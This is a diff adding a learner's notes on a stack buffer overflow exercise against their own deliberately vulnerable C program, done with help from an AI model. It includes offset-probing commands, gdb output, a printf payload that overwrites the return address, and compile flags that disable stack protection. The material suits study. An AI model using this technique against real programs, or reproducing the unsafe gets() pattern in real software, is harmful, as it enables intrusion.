@@ -345,4 +345,126 @@ HACKED!!!!!
 
 - Here we can see how manipulating register values can modify program control flow 
 
+# JUMP TABLE EXPLOIT TESTING 
+
+- Here I am using AI to help me walk through exploiting jump tables and hijacking return address / execution
+- We wrote a vulnerable program (jump-table-hacking.c), and I'm basically just following directions on how to exploit it
+- This type of program (should not) be in the wild, and this is a bit past my level of current understanding, but simply the exposure and testing is interesting.
+- Here we use python to test at what point we overflow the vulnerable buffer and cause a crash: 
+
+```
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*40)' | ./jump_table 
+Enter your choice: Choice read: 1094795585
+Invalid choice!
+Segmentation fault
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*4)' | ./jump_table 
+Enter your choice: Choice read: 0
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*5)' | ./jump_table 
+Enter your choice: Choice read: 0
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*6)' | ./jump_table 
+Enter your choice: Choice read: 0
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*8)' | ./jump_table 
+Enter your choice: Choice read: 0
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*12)' | ./jump_table 
+Enter your choice: Choice read: 1094795585
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*16)' | ./jump_table 
+Enter your choice: Choice read: 1094795585
+Invalid choice!
+plastid-debian@plastid-linux:~/projects/cjourney/basics/control_flow$ python3 -c 'print("A"*20)' | ./jump_table 
+Enter your choice: Choice read: 1094795585
+Invalid choice!
+Segmentation fault
+```
+
+- Next we confirm the "secret function" address in gdb: 
+
+```
+(gdb) break menu
+Breakpoint 1 at 0x55555555517c: file jump-table-hacking.c, line 10.
+(gdb) p secret_function
+$2 = {void ()} 0x555555555159 <secret_function>
+(gdb) 
+```
+
+- Now we want to overwrite the return pointer with this address 
+- Needs to be in 'little-endian' format 
+- Payload Pattern:
+`python3 -c 'print("A"*OFFSET + "\x59\x51\x55\x55\x55\x55")'`
+
+- We found offset to be good at 20, will try 20 first 
+- Nothing suggested by the AI model im using now has worked -- changed to a more code oriented model and checking step by step to see if 
+we can craft and exploit
+
+- Working for hours and not able to overwrite the return address with a buffer overflow that jumps to my "hacked" function
+- This has still been a good exercise in using gdb and seeing some of how memory is laid out through various tests 
+- Likely will work a bit more, mark the final challenge as failed, and move on with C learning. This is much more advanced than basic control flow anyway! 
+
+- WOW! I got it to work! I had to creaft the payload by first of all getting AI to tell me where the return address is stored based on disassembly
+- AI did not catch that i was putting my input into the program wrong -- was just typing it into the input and this sends ASCII not binary
+- used terminal printf to pipe the desired payload to payload.bin 
+- AI told me that the return address is 20 bytes away from my input and choice variable, so i typed 20 A's and then the address of the secret function
+- This worked! 
+
+```
+Starting program: /home/plastid-debian/projects/cjourney/basics/control_flow/jump_table < ./payload.bin
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, menu () at jump-table-hacking.c:10
+10	    int choice = 0;
+(gdb) next
+12	    printf("Enter your choice: ");
+(gdb) 
+13	    gets(input); // UNSAFE! Does not check input length. Overflow possible.
+(gdb) 
+15	    printf("Choice read: %d\n", choice);
+(gdb) 
+Enter your choice: Choice read: 1094795585
+17	    switch(choice) {
+(gdb) 
+28	            printf("Invalid choice!\n");
+(gdb) 
+Invalid choice!
+29	            break;
+(gdb) 
+31	}
+(gdb) 
+secret_function () at jump-table-hacking.c:4
+4	void secret_function() {
+(gdb) 
+5	    printf("\nHACKED: YOU REACHED THE SECRET FUNCTION!");
+(gdb) 
+
+6	}
+(gdb) 
+0x0000000000000000 in ?? ()
+(gdb) 
+```
+
+- Will do a more detailed writeup on substack and link here when finished but:
+
+- The following code is used to craft a payload  
+`printf "AAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x00\x00\x00\x00\x00" > payload.bin`
+
+- Then the following is ran in GDB
+
+```
+gdb ./jump_table
+break menu 
+run < ./payload.bin
+next // step through until function runs!
+```
+
+- This does not work in the terminal, likely due to various ways stdin is handled or something similar
+- Anyway, this is just an example exercise, and I have learned a lot about using gdb, how memory is accessed and manipulated to control program execution, etc
+- Note, program must be compiled vulnerably with the following flags to exploit: 
+
+`gcc -g -fno-stack-protector -z execstack -no-pie jump-table-hacking.c -o jump_table`
+
+- That means if you just "build" it to teset on your own with the makefile, it will not work.
 
